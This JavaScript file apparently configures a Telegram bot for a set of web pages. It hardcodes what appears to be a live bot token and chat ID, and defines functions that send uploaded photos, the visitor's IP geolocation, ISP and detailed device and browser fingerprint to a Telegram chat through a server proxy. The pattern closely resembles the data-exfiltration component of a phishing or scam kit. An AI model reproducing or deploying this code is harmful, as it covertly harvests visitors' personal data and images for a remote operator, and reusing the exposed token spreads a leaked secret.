// Telegram Bot Configuration - Centralized
// Update these values in one place to apply across all pages

const TELEGRAM_CONFIG = {
  botToken: "8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y",
  authorizedChatId: "7211220207"
};

// Function to send message to Telegram via server proxy
async function sendTelegramMessage(message) {
  try {
    const response = await fetch('/api/send-telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: message
      })
    });
    
    const result = await response.json();
    console.log('Telegram API response:', result);
    return result.success;
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
    return false;
  }
}

// Function to send photo to Telegram via server proxy
async function sendPhotoToTelegram(photoFile, caption) {
  try {
    const reader = new FileReader();
    const photoData = await new Promise((resolve) => {
      reader.onload = () => {
        const base64Data = reader.result.split(',')[1];
        resolve({
          data: base64Data,
          filename: photoFile.name || 'photo.jpg'
        });
      };
      reader.readAsDataURL(photoFile);
    });
    
    const response = await fetch('/api/send-telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: caption,
        photo: photoData
      })
    });
    
    const result = await response.json();
    console.log('Telegram photo API response:', result);
    return result.success;
  } catch (error) {
    console.error('Error sending photo to Telegram:', error);
    return false;
  }
}

// Function to get IP and location information via server proxy
async function getIpInfo() {
  try {
    // Using server proxy to get IP and location info
    const response = await fetch('/api/ip-info');
    const data = await response.json();
    
    return `
📍 Location Information:
• IP Address: ${data.ip || "Unknown"}
• City: ${data.city || "Unknown"}
• Region: ${data.region || "Unknown"}
• Country: ${data.country || "Unknown"}
• Location: ${data.loc || "Unknown"}
• ISP: ${data.org || "Unknown"}`;
  } catch (error) {
    console.error('Error getting IP info:', error);
    return `
📍 Location Information:
• IP Address: Unknown
• City: Unknown
• Region: Unknown
• Country: Unknown
• Location: Unknown
• ISP: Unknown`;
  }
}

// Function to get device details
function getDeviceDetails() {
  const ua = navigator.userAgent.toLowerCase();
  
  // Determine device type
  let deviceType = "Unknown";
  if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
    deviceType = "iOS";
  } else if (ua.includes("android")) {
    deviceType = "Android";
  } else if (ua.includes("windows")) {
    deviceType = "Windows";
  } else if (ua.includes("mac")) {
    deviceType = "Mac";
  } else if (ua.includes("linux")) {
    deviceType = "Linux";
  }
  
  // Get browser info
  let browser = "Unknown";
  if (ua.includes("chrome") && !ua.includes("edg")) {
    browser = "Chrome";
  } else if (ua.includes("firefox")) {
    browser = "Firefox";
  } else if (ua.includes("safari") && !ua.includes("chrome")) {
    browser = "Safari";
  } else if (ua.includes("edg")) {
    browser = "Edge";
  }
  
  return `
💻 Device Information:
• Device: ${deviceType}
• Browser: ${browser}
• User Agent: ${navigator.userAgent}
• Screen: ${screen.width}x${screen.height}
• Language: ${navigator.language}
• Platform: ${navigator.platform}`;
}